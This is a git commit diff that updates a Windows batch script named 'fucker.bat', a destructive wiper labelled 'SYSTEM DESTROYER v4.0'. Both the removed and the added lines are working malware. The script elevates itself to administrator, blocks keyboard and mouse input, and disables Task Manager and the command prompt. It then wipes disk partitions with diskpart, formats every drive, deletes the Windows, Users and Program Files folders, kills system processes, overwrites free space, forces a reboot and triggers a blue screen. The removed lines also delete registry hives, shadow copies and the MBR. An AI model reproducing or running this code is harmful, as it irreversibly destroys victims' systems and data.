8c271f22ac4086ce519a9080af398d3c55f1cf51
Minish777 <frostdgs2000@gmail.com>
2025-12-28 14:59:41 +0300

    Update fucker.bat

--- fucker.bat
+++ fucker.bat
@@ -1,140 +1,124 @@
 @echo off
 setlocal enabledelayedexpansion
 
-REM Получаем права администратора автоматически
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 if '%errorlevel%' NEQ '0' (
-    echo Запрос прав администратора...
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
-echo УНИЧТОЖЕНИЕ СИСТЕМЫ - КОНЕЧНЫЙ ПРОТОКОЛ
-echo ==========================================
-echo Уровень разрушения: MAXIMUM
-echo Восстановление: НЕВОЗМОЖНО
-echo ==========================================
+echo ========================================
+echo    SYSTEM DESTROYER v4.0 - FINAL
+echo ========================================
+echo.
 
-REM 1. Уничтожаем загрузчик и MBR
-echo [1] Уничтожение загрузчика...
-bootsect /nt52 C: /force /mbr >nul 2>&1
-bootsect /nt60 C: /force /mbr >nul 2>&1
-echo   Загрузчик уничтожен ✓
+REM === БЛОКИРОВКА КЛАВИШ И МЫШИ ===
+echo [0] Блокировка интерфейса...
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul 2>&1
+powershell -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class User32{[DllImport(\"user32.dll\")]public static extern bool BlockInput(bool fBlockIt);}';[User32]::BlockInput($true)"
 
-REM 2. Уничтожаем реестр
-echo [2] Уничтожение реестра Windows...
-reg delete HKLM\SOFTWARE /f >nul 2>&1
-reg delete HKLM\SYSTEM /f >nul 2>&1
-reg delete HKCU\SOFTWARE /f >nul 2>&1
-echo   Реестр уничтожен ✓
+REM === СКАЧИВАНИЕ И УСТАНОВКА ОБОЕВ ===
+echo [1] Установка обоев...
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://avatars.mds.yandex.net/i?id=27fde2643b29de9539d53dcb39448767_l-10814230-images-thumbs&n=13', '%TEMP%\wallpaper.jpg')"
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\wallpaper.jpg" /f >nul 2>&1
+reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "2" /f >nul 2>&1
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
 
-REM 3. Уничтожаем системные файлы (агрессивный метод)
-echo [3] Уничтожение системных файлов...
-for %%d in (C D E F) do (
-    if exist %%d:\ (
-        echo   Уничтожение диска %%d:...
-        del /f /s /q %%d:\*.dll >nul 2>&1
-        del /f /s /q %%d:\*.exe >nul 2>&1
-        del /f /s /q %%d:\*.sys >nul 2>&1
-        del /f /s /q %%d:\Windows\*.* >nul 2>&1
-    )
+REM === СПАМ TXT ФАЙЛАМИ НА РАБОЧЕМ СТОЛЕ ===
+echo [2] Создание файлов...
+set "desktop=%USERPROFILE%\Desktop"
+for /l %%i in (1,1,500) do (
+    echo im fuck your pc > "%desktop%\FUCKED_%%i.txt"
 )
 
-REM 4. Уничтожаем папки Windows (агрессивно через takeown + icacls)
-echo [4] Уничтожение системных папок...
-set folders=C:\Windows\System32 C:\Windows\SysWOW64 C:\Windows\Boot C:\Windows\WinSxS C:\Windows\Globalization C:\Windows C:\ProgramData C:\Program Files C:\Program Files (x86) C:\Users
+REM === БЛОКИРОВКА ДИСПЕТЧЕРА ЗАДАЧ И ДРУГИХ СИСТЕМНЫХ ФУНКЦИЙ ===
+echo [3] Блокировка системных функций...
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
 
-for %%f in (%folders%) do (
-    if exist "%%f" (
-        echo   Уничтожение: %%f
-        REM Сначала получаем владение
-        takeown /f "%%f" /r /d y >nul 2>&1
-        REM Даем полные права
-        icacls "%%f" /grant everyone:F /t >nul 2>&1
-        icacls "%%f" /grant Administrators:F /t >nul 2>&1
-        REM Уничтожаем
-        rd /s /q "%%f" >nul 2>&1
-        if exist "%%f" (
-            del /f /s /q "%%f\*.*" >nul 2>&1
-            rd /s /q "%%f" >nul 2>&1
-        )
-    )
+REM === БЛОКИРОВКА ПЕРЕЗАГРУЗКИ ИЗ ИНТЕРФЕЙСА ===
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f >nul 2>&1
+
+REM === УНИЧТОЖЕНИЕ MBR И GPT ===
+echo [4] Уничтожение загрузчика...
+for %%d in (0 1 2 3) do (
+    echo select disk %%d > %temp%\clean.dps
+    echo clean >> %temp%\clean.dps
+    echo exit >> %temp%\clean.dps
+    diskpart /s %temp%\clean.dps >nul 2>&1
 )
 
-REM 5. Уничтожаем таблицы разделов через diskpart
-echo [5] Уничтожение таблиц разделов...
-echo select disk 0 > %temp%\destroy.txt
-echo clean all >> %temp%\destroy.txt
-echo exit >> %temp%\destroy.txt
-diskpart /s %temp%\destroy.txt >nul 2>&1
-echo   Разделы уничтожены ✓
-
-REM 6. Форматируем все диски
-echo [6] Форматирование дисков...
+REM === ФОРМАТИРОВАНИЕ ДИСКОВ ===
+echo [5] Форматирование всех дисков...
 for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%d:\ (
-        echo   Форматирование %%d:...
-        echo y|format %%d: /FS:NTFS /Q /X >nul 2>&1
-        echo y|format %%d: /FS:FAT32 /Q /X >nul 2>&1
+        echo y|format %%d: /FS:NTFS /Q /X /V:DEAD >nul 2>&1
     )
 )
 
-REM 7. Уничтожаем MBR физически (запись нулей)
-echo [7] Физическое уничтожение MBR...
-echo 0 | debug < %temp%\mbr.txt >nul 2>&1
-echo   MBR уничтожен ✓
-
-REM 8. Уничтожаем все файлы на всех дисках (последняя фаза)
-echo [8] Финальное уничтожение...
-for /f "tokens=2 delims==" %%d in ('wmic logicaldisk get caption /value') do (
-    if exist %%d (
-        echo   Очистка диска %%d...
-        del /f /s /q %%d\*.* >nul 2>&1
-        for /d %%p in ("%%d\*") do rd /s /q "%%p" >nul 2>&1
+REM === УДАЛЕНИЕ СИСТЕМНЫХ ПАПОК ===
+echo [6] Уничтожение системных папок...
+for %%f in ("C:\Windows" "C:\Program Files" "C:\Program Files (x86)" "C:\Users" "C:\ProgramData") do (
+    if exist %%f (
+        takeown /f %%f /r /d y >nul 2>&1
+        icacls %%f /grant everyone:F /t /c /q >nul 2>&1
+        rd /s /q %%f >nul 2>&1
     )
 )
 
-REM 9. Уничтожаем файлы восстановления и теневые копии
-echo [9] Уничтожение восстановления...
-vssadmin delete shadows /all /quiet >nul 2>&1
-wbadmin delete catalog -quiet >nul 2>&1
-echo   Восстановление уничтожено ✓
+REM === СПАМ В КОНСОЛИ ===
+:spam
+echo im fuck your pc, windows user
+echo im fuck your pc, windows user
+echo im fuck your pc, windows user
+echo im fuck your pc, windows user
+echo im fuck your pc, windows user
+echo im fuck your pc, windows user
+echo im fuck your pc, windows user
+echo im fuck your pc, windows user
+echo im fuck your pc, windows user
+echo im fuck your pc, windows user
+goto spam
 
-REM 10. Стираем свободное пространство (запись случайных данных)
-echo [10] Затирание свободного места...
-cipher /w:C:\ >nul 2>&1
-cipher /w:D:\ >nul 2>&1
-echo   Диски затерты ✓
+REM === ДОПОЛНИТЕЛЬНЫЕ ФАЙЛЫ ===
+echo [7] Создание дополнительных файлов...
+for /l %%i in (1,1,100) do (
+    echo SYSTEM DESTROYED >> "%desktop%\DESTROYED_%%i.txt"
+)
 
-echo ==========================================
-echo УНИЧТОЖЕНИЕ ВЫПОЛНЕНО НА 100%
-echo СИСТЕМА НЕВОССТАНАВЛИВАЕМА
-echo ==========================================
+REM === БЛОКИРОВКА ПРОЦЕССОВ ===
+echo [8] Блокировка процессов...
+taskkill /f /im taskmgr.exe >nul 2>&1
+taskkill /f /im explorer.exe >nul 2>&1
+taskkill /f /im regedit.exe >nul 2>&1
+taskkill /f /im cmd.exe /fi "PID ne %PID%" >nul 2>&1
 
-REM Принудительная перезагрузка БЕЗ ВОЗМОЖНОСТИ ОТМЕНЫ
+REM === ЗАТИРАНИЕ СВОБОДНОГО ПРОСТРАНСТВА ===
+echo [9] Затирание дисков...
+for %%d in (C D E F) do if exist %%d:\ cipher /w:%%d:\ >nul 2>&1
+
+REM === ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА ===
 echo.
-echo ПЕРЕЗАГРУЗКА ЧЕРЕЗ 5 СЕКУНД...
-echo Ctrl+C НЕ РАБОТАЕТ
-echo.
+echo ========================================
+echo    СИСТЕМА УНИЧТОЖЕНА
+echo    Перезагрузка через 10 секунд...
+echo ========================================
 
-REM Отключаем возможность прерывания
-break >nul
-timeout /t 5 /nobreak >nul
+REM === СОЗДАНИЕ ПРОЦЕССОВ-БЛОКИРОВЩИКОВ ===
+for /l %%i in (1,1,20) do (
+    start /min "" cmd /c "echo DO NOT CLOSE && timeout /t 9999"
+)
 
-REM Агрессивная перезагрузка с форсированием
-echo ВЫПОЛНЯЕТСЯ ПЕРЕЗАГРУЗКА...
-start /min "" cmd /c "shutdown /r /f /t 0 /c ""SYSTEM DESTROYED - REBOOTING"" "
+timeout /t 10 /nobreak >nul
 
-REM Дополнительные методы перезагрузки (гарантия)
-powershell -Command "Restart-Computer -Force" >nul 2>&1
-shutdown /r /f /t 0 >nul 2>&1
-
-REM Если все еще работает - вызываем синий экран
-rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
-rundll32.exe ntdll.dll,NtRaiseHardError 0xc000021a 0 0 0 6 >nul 2>&1
-
-REM Последний метод - перезагрузка через BIOS
+shutdown /r /f /t 0
 wmic os where primary=1 call reboot >nul 2>&1
 
-REM Если ничего не сработало - просто выходим
-exit
+REM === ЕСЛИ ПЕРЕЗАГРУЗКА НЕ СРАБОТАЛА - СИНИЙ ЭКРАН ===
+rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
+rundll32.exe ntdll.dll,NtRaiseHardError 0xc000021a 0 0 0 6 >nul 2>&1
